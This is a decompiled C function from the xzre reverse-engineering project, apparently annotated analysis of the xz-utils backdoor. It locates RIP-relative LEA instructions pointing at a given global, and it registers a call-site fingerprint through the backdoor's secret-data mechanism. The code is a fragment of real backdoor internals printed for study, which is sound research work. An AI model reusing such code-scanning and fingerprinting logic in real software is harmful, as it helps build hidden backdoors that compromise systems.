// /home/kali/xzre-ghidra/xzregh/100F60_find_lea_instruction_with_mem_operand.c
// Function: find_lea_instruction_with_mem_operand @ 0x100F60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)


/*
 * AutoDoc: General-purpose LEA finder that optionally reuses a caller-supplied decoder context.
 * It scans until `x86_dasm` reports opcode `0x10d`, requires a 64-bit operand (`REX.W`), and checks the ModRM bits to make sure the instruction actually reads memory rather than a register-form.
 * If `mem_address` is supplied it replays the RIP-relative calculation (`instruction + instruction_size + mem_disp`) and only returns TRUE when that absolute address matches, letting callers home in on a specific global.
 */

#include "xzre_types.h"

BOOL find_lea_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  byte bVar4;
  dasm_ctx_t scratch_ctx;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x1c8,0,0x1e,FALSE);
  if (BVar1 != FALSE) {
    pdVar3 = &scratch_ctx;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &scratch_ctx;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar1 = x86_dasm(dctx,code_start,code_end);
      if ((((BVar1 != FALSE) && (*(int *)(dctx->opcode_window + 3) == 0x10d)) &&
          (((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48)) &&
         ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000 &&
          ((mem_address == (void *)0x0 ||
           (dctx->instruction + dctx->mem_disp + dctx->instruction_size == (u8 *)mem_address)))))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

